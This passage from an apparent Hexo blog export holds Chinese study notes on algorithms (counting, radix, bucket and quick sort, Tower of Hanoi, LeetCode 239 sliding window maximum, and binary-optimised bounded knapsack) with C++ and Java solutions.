        for (int j &#x3D; 1; j &lt; 10; j ++ ) count[j] +&#x3D; count[j-1];
        for (int j &#x3D; n-1; j &gt;&#x3D; 0; j -- )
        &#123;
            int k &#x3D; (a[j] &#x2F; radix) % 10;
            temp[count[k]-1] &#x3D; a[j];
            count[k] -- ;
        &#125;
        for (int j &#x3D; 0; j &lt; n; j ++ ) a[j] &#x3D; temp[j];
        radix *&#x3D; 10;
    &#125;

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>9计数排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void counting_sort()
&#123;
    int sorted[N];
    int maxv &#x3D; a[0];
    for (int i &#x3D; 1; i &lt; n; i ++ )
        if (maxv &lt; a[i])
            maxv &#x3D; a[i];
    int count[maxv+1];
    for (int i &#x3D; 0; i &lt; n; i ++ ) count[a[i]] ++ ;
    for (int i &#x3D; 1; i &lt;&#x3D; maxv; i ++ ) count[i] +&#x3D; count[i-1];
    for (int i &#x3D; n-1; i &gt;&#x3D; 0; i -- )
    &#123;
        sorted[count[a[i]]-1] &#x3D; a[i];
        count[a[i]] -- ;
    &#125;
    for (int i &#x3D; 0; i &lt; n; i ++ ) a[i] &#x3D; sorted[i];
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>10桶排序（基数排序是桶排序的特例，优势是可以处理浮点数和负数，劣势是还要配合别的排序函数）</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">vector&lt;int&gt; bucketSort(vector&lt;int&gt;&amp; nums) &#123;
    int n &#x3D; nums.size();
    int maxv &#x3D; *max_element(nums.begin(), nums.end());
    int minv &#x3D; *min_element(nums.begin(), nums.end());
    int bs &#x3D; 1000;
    int m &#x3D; (maxv-minv)&#x2F;bs+1;
    vector&lt;vector&lt;int&gt; &gt; bucket(m);
    for (int i &#x3D; 0; i &lt; n; ++i) &#123;
        bucket[(nums[i]-minv)&#x2F;bs].push_back(nums[i]);
    &#125;
    int idx &#x3D; 0;
    for (int i &#x3D; 0; i &lt; m; ++i) &#123;
        int sz &#x3D; bucket[i].size();
        bucket[i] &#x3D; quickSort(bucket[i]);
        for (int j &#x3D; 0; j &lt; sz; ++j) &#123;
            nums[idx++] &#x3D; bucket[i][j];
        &#125;
    &#125;
    return nums;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>AcWing 785. 快速排序</title>
    <url>/2021/04/10/AcWing-785-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>AcWing 785. 快速排序</p>
<a id="more"></a>
<p><img src="https://cdn.acwing.com/media/article/image/2020/08/09/33780_2e3053bad9-qq_pic_merged_1596864959814.jpg" alt="qq_pic_merged_1596864959814.jpg"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
using namespace std;
const int N &#x3D; 100010;
int n, a[N];
void quicksort(int l, int r) &#123;
    &#x2F;&#x2F; 递归边界条件
    if (l &gt;&#x3D; r) return;
    &#x2F;&#x2F; 步骤 ① 中 C 方式确定分界点
    int x &#x3D; a[l + r &gt;&gt; 1];
    &#x2F;&#x2F; 步骤 ② 中 B 方式的 a 步
    int i &#x3D; l - 1, j &#x3D; r + 1;
    &#x2F;&#x2F; 步骤 ② 中 B 方式下方的“注” 确定循环条件 i, j 相遇时划分完毕
    while (i &lt; j) &#123;
        &#x2F;&#x2F; 步骤 ② 中 B 方式的 b 步
        do i++; while (a[i] &lt; x);
        &#x2F;&#x2F; 步骤 ② 中 B 方式的 c 步
        do j--; while (a[j] &gt; x);
        &#x2F;&#x2F; 步骤 ② 中 B 方式的 d 步
        if (i &lt; j) swap(a[i], a[j]);
    &#125;
    &#x2F;&#x2F; 递归处理左边区间
    quicksort(l, j);
    &#x2F;&#x2F; 递归处理右边区间
    quicksort(j + 1, r);
&#125;
int main() &#123;
    cin &gt;&gt; n;
    for (int i &#x3D; 0; i &lt; n; i++) cin &gt;&gt; a[i];
    quicksort(0, n - 1);
    for (int i &#x3D; 0; i &lt; n; i++) cout &lt;&lt; a[i] &lt;&lt; &quot; &quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void qsort(int *q,int l,int r)
&#123;
	if(l&gt;&#x3D;r) return ;
	int i&#x3D;l-1,j&#x3D;r+1,x&#x3D;q[l+r &gt;&gt;1];
	while(i&lt;j)
	&#123;
		while(q[++i]&lt;x);
		while(q[--j]&gt;x);
		if(i&lt;j) swap(q[i],q[j]);
	&#125;
	qsort(q,l,j);
	qsort(q,j+1,r);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>经典汉诺塔</title>
    <url>/2021/04/05/%E7%BB%8F%E5%85%B8%E6%B1%89%E8%AF%BA%E5%A1%94/</url>
    <content><![CDATA[<p>经典汉诺塔</p>
<a id="more"></a>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;
using namespace std;
int k&#x3D;1;
void hanuo(int n,char a,char b,char c)
&#123;
    if(n&#x3D;&#x3D;1)
        cout&lt;&lt;k++&lt;&lt;&#39;.&#39;&lt;&lt;a&lt;&lt;&quot;--&gt;&quot;&lt;&lt;c&lt;&lt;endl;
    
    else
    &#123;
        hanuo(n-1,a,c,b);
        cout&lt;&lt;k++&lt;&lt;&#39;.&#39;&lt;&lt;a&lt;&lt;&quot;--&gt;&quot;&lt;&lt;c&lt;&lt;endl;
        
        hanuo(n-1,b,a,c);

    &#125;
&#125;
int main()
&#123;

    int n;
    cin&gt;&gt;n;
    hanuo(n,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);

&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>汉诺塔（港台：河内塔）是根据一个传说形成的数学问题：</p>
<p>有三根杆子A，B，C。A杆上有 N 个 (N&gt;1) 穿孔圆盘，盘的尺寸由下到上依次变小。要求按下列规则将所有圆盘移至 C 杆：</p>
<p>每次只能移动一个圆盘；<br>大盘不能叠在小盘上面。<br>提示：可将圆盘临时置于 B 杆，也可将从 A 杆移出的圆盘重新移回 A 杆，但都必须遵循上述两条规则。</p>
<p>问：如何移？最少要移动多少次？</p>
<p><img src="http://upload.wikimedia.org/wikipedia/commons/0/07/Tower_of_Hanoi.jpeg" alt="img"></p>
<ol start="2">
<li><p>汉诺塔的本质是3个栈<br>   维基的定义只简单提到了汉诺塔的规则, 但是并没有揭示它的本质.   下面我们来分析它的本质.</p>
<p>   1.每次只能移动1个盘:<br>   也就说不能两个盘一齐移动, 必须按顺序1个1个套在柱子上,  而且只能从柱子的上方套入, 也能只能从柱子的上方取出.</p>
<p>   这明显就是1个先进后出的线性结构了,  因为出入口只有1个啊, 柱子的下方是不能放入和取出盘子的.<br>   先进后出的线性结构就是栈了,  套入柱子和取出盘子就是对应的压栈和出栈动作.   如果读者之前没有了解过栈的话, 个人建议先去了解下栈, 然后再往下看.</p>
</li>
</ol>
<pre><code>  2. 大盘不能套在小盘上面

  代表这3个栈中, 如果不是空栈, 那么压栈的元素必须比栈顶元素小, 然后才允许压栈.   这就保证栈里面的元素是从小到大排序的.


  总结:  汉诺塔的本质就是3个栈,  而且压栈的元素必须比栈顶元素(如果存在)小.</code></pre>
<ol start="3">
<li>下面我们来写递归函数。</li>
</ol>
<p>首先，题目要求求的是如何操作，那么我们就必须写一个输出操作语句的函数。</p>
<p>这个操作语句必须说明：第几步将哪个盘子从哪个柱子移动到哪个柱子上（这样人类才知道怎样移动盘子嘛）</p>
<pre><code> 这里，我们定义这个函数的函数名为move。

 接下来，我们来确定这个函数的参数列表。

 显然，为了说明第几步将哪个盘子从哪个柱子移动到哪个柱子上，我们参数列表至少应该包含：

 id，表示被移动的盘子的序号。

 from，表示从哪个柱子上移动这个编号为id的盘子

 to，表示移动到哪个柱子上

 那么这个函数的函数头就确定了：</code></pre>
<pre><code>     void move(int id, char from, char to) // 打印移动方式：编号，从哪个盘子移动到哪个盘子</code></pre>
<pre><code> 那么函数体呢？

 唯一的难点就是如何记录这是操作的第几步。

 注意到，每次操作必须输出移动方式且仅能输出一次，那么显然，我们已经printf的当前总数不就是第几次操作了嘛

 我们开一个全局变量用于记录printf的次数即可

 所以函数体中就只有这一个语句：</code></pre>
<pre><code>     printf (&quot;step %d: move %d from %c-&gt;%c\n&quot;, ++cnt, id, from, to);
     合并起来就是：

     void move(int id, char from, char to) // 打印移动方式：编号，从哪个盘子移动到哪个盘子
     &#123;
         printf (&quot;step %d: move %d from %c-&gt;%c\n&quot;, ++cnt, id, from, to);
     &#125;</code></pre>
<pre><code> 敲黑板：

 递归函数怎么写呢?

 我们先来想一下我们人类应该怎样操作吧。

 我们每次操作都会这样问自己：我们需要将哪个柱子上的多少个盘子通过哪个柱子移动到哪个柱子上呢？

 我们必须也只能用这么几个参数：

 需要移动的盘子的总数，3个柱子。

 所以函数头为：</code></pre>
<pre><code>     void hanoi(int n, char x, char y, char z)
     其中，n代表盘子总数，x，y，z代表柱子

     hanoi(n, x, y, z)的意思就是：将n个在x柱子上的盘子通过y这个柱子移动到z这个柱子上。

     那不就完了！

     hanoi(n, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;)就是这道问题的答案！</code></pre>
<pre><code> 那么这一步的前一步是什么？</code></pre>
<pre><code>     记住了，在求解f(n, other variables)的时候，我们直接默认f(n - 1, other variables)已经完了就可以了！这个在前面已经解释过了，在此不再鳌述。</code></pre>
<pre><code> 我们将n-1个盘子当作一个整体：这就是类似于分治求解子问题的思想

 那么，前一步也就是f(n - 1, other variables)显然是先将n -1 个在A柱子上的盘子通过C柱移动到B柱上，再将在A柱子上的编号为n的盘子移动到C柱上，再将B柱子上的n-1个盘子通过A柱移动到C柱上，over</code></pre>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 239. 滑动窗口最大值</title>
    <url>/2021/04/05/Leetcode-239-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC/</url>
    <content><![CDATA[<p>Leetcode 239. 滑动窗口最大值</p>
<a id="more"></a>
<p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。</p>
<p>返回滑动窗口中的最大值。</p>
<p>示例 1：</p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums &#x3D; [1,3,-1,-3,5,3,6,7], k &#x3D; 3
输出：[3,3,5,5,6,7]
解释：
滑动窗口的位置                最大s值

---------------               -----
[1  3  -1] -3  5  3  6  7       3
 1 [3  -1  -3] 5  3  6  7       3
 1  3 [-1  -3  5] 3  6  7       5
 1  3  -1 [-3  5  3] 6  7       5
 1  3  -1  -3 [5  3  6] 7       6
 1  3  -1  -3  5 [3  6  7]      7
示例 2：

输入：nums &#x3D; [1], k &#x3D; 1
输出：[1]
示例 3：

输入：nums &#x3D; [1,-1], k &#x3D; 1
输出：[1,-1]
示例 4：

输入：nums &#x3D; [9,11], k &#x3D; 2
输出：[11]
示例 5：

输入：nums &#x3D; [4,-2], k &#x3D; 2
输出：[4]


提示：

1 &lt;&#x3D; nums.length &lt;&#x3D; 105
-104 &lt;&#x3D; nums[i] &lt;&#x3D; 104
1 &lt;&#x3D; k &lt;&#x3D; nums.length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k)
    &#123;
    	int n&#x3D;nums.size();
    	vector&lt;int&gt; pre(n),tail(n);
    	for(int i&#x3D;0;i&lt;n;++i)
    	&#123;	
    		if(i%k&#x3D;&#x3D;0)
    			pre[i]&#x3D;nums[i];
    		else
    			pre[i]&#x3D;max(pre[i-1],nums[i]);
    	&#125;
    	for(int i&#x3D;n-1;i&gt;&#x3D;0;--i)
    	&#123;
    		if(i&#x3D;&#x3D; n-1 || (i+1)%k&#x3D;&#x3D;0)
    			tail[i]&#x3D;nums[i];
    		else
    			tail[i]&#x3D;max(tail[i+1],nums[i]);
    	&#125;
    	vector&lt;int&gt; ams;
    	for(int i&#x3D;0;i&lt;&#x3D;n-k;++i)
    	&#123;
    		ams.push_back(max(tail[i],pre[i+k-1]));
    	&#125;
    	return ams;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class duilie
&#123;
public:
	deque&lt;int&gt; data;

	void Push(int n)
	&#123;
		while(!data.empty() &amp;&amp; data.back() &lt; n)
			data.pop_back();
		data.push_back(n);
	&#125;
	int Max()
	&#123;
		return data.front();
	&#125;
	void Pop(int n)
	&#123;
		if(!data.empty() &amp;&amp; data.front() &#x3D;&#x3D;n)
			data.pop_front();
	&#125;
&#125;;


class Solution &#123;
public:
    vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) 
    &#123;
    	duilie dan;
    	int n&#x3D;nums.size();
    	vector&lt;int&gt; s;
    	for(int i&#x3D;0;i&lt;n;++i)
    	&#123;
    		if(i&lt;k-1)
    			dan.Push(nums[i]);
    		else
    		&#123;
    			dan.Push(nums[i]);
    			s.push_back(dan.Max());
    			dan.Pop(nums[i-k+1]);
    		&#125;
    	&#125;
    	return s;

    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>思路<br>遍历数组，将 数 存放在双向队列中，并用 L,R 来标记窗口的左边界和右边界。队列中保存的并不是真的 数，而是该数值对应的数组下标位置，并且数组中的数要从大到小排序。如果当前遍历的数比队尾的值大，则需要弹出队尾值，直到队列重新满足从大到小的要求。刚开始遍历时，L 和 R 都为 0，有一个形成窗口的过程，此过程没有最大值，L 不动，R 向右移。当窗口大小形成时，L 和 R 一起向右移，每次移动时，判断队首的值的数组下标是否在 [L,R] 中，如果不在则需要弹出队首的值，当前窗口的最大值即为队首的数。</p>
<pre class="line-numbers language-none"><code class="language-none">示例

输入: nums &#x3D; [1,3,-1,-3,5,3,6,7], 和 k &#x3D; 3
输出: [3,3,5,5,6,7]

解释过程中队列中都是具体的值，方便理解，具体见代码。
初始状态：L&#x3D;R&#x3D;0,队列:&#123;&#125;
i&#x3D;0,nums[0]&#x3D;1。队列为空,直接加入。队列：&#123;1&#125;
i&#x3D;1,nums[1]&#x3D;3。队尾值为1，3&gt;1，弹出队尾值，加入3。队列：&#123;3&#125;
i&#x3D;2,nums[2]&#x3D;-1。队尾值为3，-1&lt;3，直接加入。队列：&#123;3,-1&#125;。此时窗口已经形成，L&#x3D;0,R&#x3D;2，result&#x3D;[3]
i&#x3D;3,nums[3]&#x3D;-3。队尾值为-1，-3&lt;-1，直接加入。队列：&#123;3,-1,-3&#125;。队首3对应的下标为1，L&#x3D;1,R&#x3D;3，有效。result&#x3D;[3,3]
i&#x3D;4,nums[4]&#x3D;5。队尾值为-3，5&gt;-3，依次弹出后加入。队列：&#123;5&#125;。此时L&#x3D;2,R&#x3D;4，有效。result&#x3D;[3,3,5]
i&#x3D;5,nums[5]&#x3D;3。队尾值为5，3&lt;5，直接加入。队列：&#123;5,3&#125;。此时L&#x3D;3,R&#x3D;5，有效。result&#x3D;[3,3,5,5]
i&#x3D;6,nums[6]&#x3D;6。队尾值为3，6&gt;3，依次弹出后加入。队列：&#123;6&#125;。此时L&#x3D;4,R&#x3D;6，有效。result&#x3D;[3,3,5,5,6]
i&#x3D;7,nums[7]&#x3D;7。队尾值为6，7&gt;6，弹出队尾值后加入。队列：&#123;7&#125;。此时L&#x3D;5,R&#x3D;7，有效。result&#x3D;[3,3,5,5,6,7]
通过示例发现 R&#x3D;i，L&#x3D;k-R。由于队列中的值是从大到小排序的，所以每次窗口变动时，只需要判断队首的值是否还在窗口中就行了。
解释一下为什么队列中要存放数组下标的值而不是直接存储数值，因为要判断队首的值是否在窗口范围内，由数组下标取值很方便，而由值取数组下标不是很方便。
代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">Java

class Solution &#123;
    public int[] maxSlidingWindow(int[] nums, int k) &#123;
        if(nums &#x3D;&#x3D; null || nums.length &lt; 2) return nums;
        &#x2F;&#x2F; 双向队列 保存当前窗口最大值的数组位置 保证队列中数组位置的数值按从大到小排序
        LinkedList&lt;Integer&gt; queue &#x3D; new LinkedList();
        &#x2F;&#x2F; 结果数组
        int[] result &#x3D; new int[nums.length-k+1];
        &#x2F;&#x2F; 遍历nums数组
        for(int i &#x3D; 0;i &lt; nums.length;i++)&#123;
            &#x2F;&#x2F; 保证从大到小 如果前面数小则需要依次弹出，直至满足要求
            while(!queue.isEmpty() &amp;&amp; nums[queue.peekLast()] &lt;&#x3D; nums[i])&#123;
                queue.pollLast();
            &#125;
            &#x2F;&#x2F; 添加当前值对应的数组下标
            queue.addLast(i);
            &#x2F;&#x2F; 判断当前队列中队首的值是否有效
            if(queue.peek() &lt;&#x3D; i-k)&#123;
                queue.poll();   
            &#125; 
            &#x2F;&#x2F; 当窗口长度为k时 保存当前窗口中最大值
            if(i+1 &gt;&#x3D; k)&#123;
                result[i+1-k] &#x3D; nums[queue.peek()];
            &#125;
        &#125;
        return result;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://i.loli.net/2021/04/05/rnzlCoVj2SRWHqY.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/04/05/Jr3BspVWocUzX5q.gif" alt="队列LeetCode239动画01.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/Jr3BspVWocUzX5q.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/zmASBs9hwNI8kpe.gif" alt="队列LeetCode239元素5入队.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/Jr3BspVWocUzX5q.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/izKy8uc3UsWg1FL.gif" alt="队列LeetCode2393出队4入队.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/T6Ceo5xyQqIJkUd.gif" alt="队列LeetCode2391入队.gif"></p>
<p><img src="https://i.loli.net/2021/04/05/HAEKu19Ofd6CZbW.gif" alt="队列LeetCode239缩小边界5出队.gif"></p>
]]></content>
  </entry>
  <entry>
    <title>AcWing 多重背包</title>
    <url>/2021/04/05/AcWing%20%E5%A4%9A%E9%87%8D%E8%83%8C%E5%8C%85/</url>
    <content><![CDATA[<p>多重背包</p>
<a id="more"></a>
<p>有 NN 种物品和一个容量是 VV 的背包。</p>
<p>第 ii 种物品最多有 sisi 件，每件体积是 vivi，价值是 wiwi。</p>
<p>求解将哪些物品装入背包，可使物品体积总和不超过背包容量，且价值总和最大。<br>输出最大价值。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行两个整数，N，VN，V，用空格隔开，分别表示物品种数和背包容积。</p>
<p>接下来有 NN 行，每行三个整数 vi,wi,sivi,wi,si，用空格隔开，分别表示第 ii 种物品的体积、价值和数量。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示最大价值。</p>
<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>0&lt;N≤10000&lt;N≤1000<br>0&lt;V≤20000&lt;V≤2000<br>0&lt;vi,wi,si≤20000&lt;vi,wi,si≤2000</p>
<h5 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h5><p>本题考查多重背包的二进制优化方法。</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><pre class="line-numbers language-none"><code class="language-none">4 5
1 2 3
2 4 1
3 4 3
4 5 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://gitee.com/chzarles/images/raw/master/imgs/006eb5E0gy1g7z0e5ghloj31150fw0ub.jpg" alt="image.png"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
using namespace std;
int main()
&#123;
   int N, V;
   cin &gt;&gt; N &gt;&gt; V;
   int k &#x3D; 1;
   int v[30000], w[30000], bag[30000];
   for (int i &#x3D; 0; i &lt; N; i++)
   &#123;
      int v1, w1, s1;
      cin &gt;&gt; v1 &gt;&gt; w1 &gt;&gt; s1;

      for (int j &#x3D; 1; j &lt;&#x3D; s1; j &lt;&lt;&#x3D; 1)
      &#123;
         v[k] &#x3D; v1 * j;
         w[k++] &#x3D; w1 * j;
         s1 -&#x3D; j;
      &#125;
      if (s1 &gt; 0)
      &#123;
         v[k] &#x3D; s1 * v1;
         w[k++] &#x3D; s1 * w1;
      &#125;
   &#125;
   for (int i &#x3D; 1; i &lt;&#x3D; k; i++)
      for (int j &#x3D; V; j &gt;&#x3D; v[i]; j--)
         bag[j] &#x3D; max(bag[j], bag[j - v[i]] + w[i]);
   cout &lt;&lt; bag[V]&lt;&lt;endl;
   return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<p>前言<br>一开始看了3次视频还是一头雾水，看了前面大佬们的题解也还是一脸懵逼，最后十分感谢一篇 博客 的讲解出多重背包的二进制优化的三个要点，最后去看视频。<br>我才完全解决我最重要的疑惑：二进制优化，它为什么正确，为什么合理，凭什么可以这样分？？</p>
<p>题目<br>完全背包的二进制优化</p>
<p>样例<br>4 5<br>1 2 3<br>2 4 1<br>3 4 3<br>4 5 2<br>数据范围</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">0 &lt; N ≤ 1000
0 &lt; V ≤ 2000
0 &lt; vi,wi,si ≤ 2000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>疑惑1：为什么最后一项会是f[i-1,j-(S+1)v]+Sw??<br>在完全背包中,通过两个状态转移方程：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">f[i , j ] &#x3D; max( f[i-1,j] , f[i-1,j-v]+w , f[i-1,j-2v]+2w , f[i-1,j-3v]+3w, .....)
f[i , j-v]&#x3D; max( f[i-1,j-v] , f[i-1,j-2v] + w, f[i-1,j-2v]+2w , .....)

通过上述比较，可以得到 f[ i ][ j ] &#x3D; max(f[ i - 1 ][ j ],f[ i ][ j - v ] + w)。

再来看下多重背包,
f[i , j ] &#x3D; max( f[i-1,j] ,f[i-1,j-v]+w ,f[i-1,j-2v]+2w ,..... f[i-1,j-Sv]+Sw, )
f[i , j-v]&#x3D; max( f[i-1,j-v] ,f[i-1,j-2v]+w, ..... f[i-1,j-Sv]+(S-1)w, f[i-1,j-(S+1)v]+Sw )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>怎么比完全背包方程比较就多出了一项?<br>其实，一般从实际含义出发来考虑即可，这里是在分析f[i,j-w]这个状态的表达式，首先这个状态的含义是 从前i个物品中选，且总体积不超过j-w的最大价值， 我们现在最多只能选s个物品，因此如果我们选s个第i个物品，那么体积上就要减去 s * v,价值上就要加上s * w，那更新到状态中去就是 f[i - 1, j - v - s * v] + s * w。</p>
<p>那为什么完全背包不会有最后一项？<br>完全背包由于对每种物品没有选择个数的限制，所以只要体积够用就可以一直选，没有最后一项。</p>
<p>疑惑2：为什么不能用像完全背包一样去优化？<br>y总算法基础课视频 4分10秒-5分42秒</p>
<p>疑惑3：二进制优化，它为什么正确，为什么合理，凭什么可以这样分？？<br>我们首先确认三点：</p>
<p>（1）我们知道转化成01背包的基本思路就是：判断每件物品我是取了你好呢还是不取你好。</p>
<p>（2）我们知道任意一个实数可以由二进制数来表示，也就是2^0~2^k其中一项或几项的和。</p>
<p>（3）这里多重背包问的就是每件物品取多少件可以获得最大价值。</p>
<p>分析：</p>
<p>如果直接遍历转化为01背包问题，是每次都拿一个来问，取了好还是不取好。那么根据数据范围，这样的时间复杂度是O(n^3),也就是1e+9，这样是毫无疑问是会TLE的。</p>
<p>假如10个取7个好，那么在实际的遍历过程中在第7个以后经过状态转移方程其实已经是选择“不取”好了。现在，用二进制思想将其分堆，分成k+1个分别有2^k个的堆，然后拿这一堆一堆去问，我是取了好呢，还是不取好呢，经过dp选择之后，结果和拿一个一个来问的结果是完全一样的，因为dp选择的是最优结果，而根据第二点任意一个实数都可以用二进制来表示，如果最终选出来10个取7个是最优的在分堆的选择过程中分成了2^0=1,2^1=2,2^2=4,10 - 7 = 3 这四堆，然后去问四次，也就是拿去走dp状态转移方程，走的结果是第一堆1个，取了比不取好，第二堆2个，取了比不取好，第三堆四个，取了比不取好，第四堆8个，取了还不如不取，最后依旧是取了1+2+4=7个。</p>
<p>Tip:参考博客</p>
<p>如果仍然不是很能理解的话，取这样一个例子:要求在一堆苹果选出n个苹果。我们传统的思维是一个一个地去选，选够n个苹果就停止。这样选择的次数就是n次</p>
<p>二进制优化思维就是：现在给出一堆苹果和10个箱子，选出n个苹果。将这一堆苹果分别按照1,2,4,8,16,…..512分到10个箱子里，那么由于任何一个数字x ∈[1,1024]<br>都可以从这10个箱子里的苹果数量表示出来，但是这样选择的次数就是 ≤10次 。</p>
<p>这样利用二进制优化，时间复杂度就从O(n^3)降到O(n^2logS),从4<em>10^9降到了2</em>10^7。</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">代码
#include&lt;iostream&gt;
using namespace std;

const int N &#x3D; 12010, M &#x3D; 2010;

int n, m;
int v[N], w[N]; &#x2F;&#x2F;逐一枚举最大是N*logS
int f[M]; &#x2F;&#x2F; 体积&lt;M

int main()
&#123;
    cin &gt;&gt; n &gt;&gt; m;
    int cnt &#x3D; 0; &#x2F;&#x2F;分组的组别
    for(int i &#x3D; 1;i &lt;&#x3D; n;i ++)
    &#123;
        int a,b,s;
        cin &gt;&gt; a &gt;&gt; b &gt;&gt; s;
        int k &#x3D; 1; &#x2F;&#x2F; 组别里面的个数
        while(k&lt;&#x3D;s)
        &#123;
            cnt ++ ; &#x2F;&#x2F;组别先增加
            v[cnt] &#x3D; a * k ; &#x2F;&#x2F;整体体积
            w[cnt] &#x3D; b * k; &#x2F;&#x2F; 整体价值
            s -&#x3D; k; &#x2F;&#x2F; s要减小
            k *&#x3D; 2; &#x2F;&#x2F; 组别里的个数增加
        &#125;
        &#x2F;&#x2F;剩余的一组
        if(s&gt;0)
        &#123;
            cnt ++ ;
            v[cnt] &#x3D; a*s; 
            w[cnt] &#x3D; b*s;
        &#125;
    &#125;

    n &#x3D; cnt ; &#x2F;&#x2F;枚举次数正式由个数变成组别数
    
    &#x2F;&#x2F;01背包一维优化
    for(int i &#x3D; 1;i &lt;&#x3D; n ;i ++)
        for(int j &#x3D; m ;j &gt;&#x3D; v[i];j --)
